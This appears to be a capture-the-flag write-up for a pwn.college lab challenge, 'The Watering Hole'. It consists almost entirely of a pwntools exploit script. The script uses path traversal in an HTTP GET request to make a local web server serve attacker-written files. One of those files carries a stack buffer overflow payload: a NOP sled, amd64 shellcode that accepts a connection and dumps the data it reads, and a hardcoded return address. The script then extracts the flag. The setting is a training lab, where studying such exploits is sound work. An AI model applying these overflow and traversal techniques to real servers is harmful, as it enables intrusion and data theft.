# The Watering Hole

#### Same as last challenge except swapping out opening a file to accepting a connection from the victim in the shellcode:
```python
from pwn import *
import re

context.log_level = 'error'
context.arch = 'amd64'

def shell():
    asmbl = """
    mov rbx, 3
    push 43; pop rax
    mov rdi, rbx
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov rdi, rax     
    xor rax, rax
    mov rsi, rsp 
    mov rdx, 1000    
    syscall

    mov rdx, rax
    mov rax, 1
    mov rdi, 1
    mov rsi, rsp
    syscall

    mov rax, 60
    syscall
    """
    sc = asm(asmbl)
    buff = 8208
    addr = 0x7fffffffa000

    try:
        ws = process(['/challenge/server'])
        ws.recvuntil(b"Listening on port 80.", timeout=5)

        with open('/tmp/hl.bin', 'wb') as f:
            f.write(b'A'*8000)

        iw = remote('localhost', 80)
        iw.send(b'GET /../../../../../tmp/hl.bin HTTP/1.1 \r\n\r\n')
        r = iw.recvall(timeout=1)
        iw.close()

            
        h_len = len(r.split(b'\n\n')[0]) + 2
        pad = buff - h_len - len(sc)

        hack = b'\x90' * pad + sc
        hack += p64(addr + h_len + (pad // 2))
        
        with open('/tmp/hack.bin', 'wb') as f:
            f.write(hack)

        iw = remote('localhost', 80)
        iw.send(b'GET /../../../../../tmp/hack.bin HTTP/1.1 \r\n\r\n') 
        iw.close()      

        v = process(['/challenge/victim'])
        out = ws.recvall(timeout=1)
        ws.close()
        v.close()
        
        if b'pwn.college' in out:
            flag = re.search(rb'pwn\.college\{.*?\}', out).group()
            print(flag.decode(errors='ignore'))
            
    except Exception:
        pass

if __name__ == '__main__':
    shell()
```
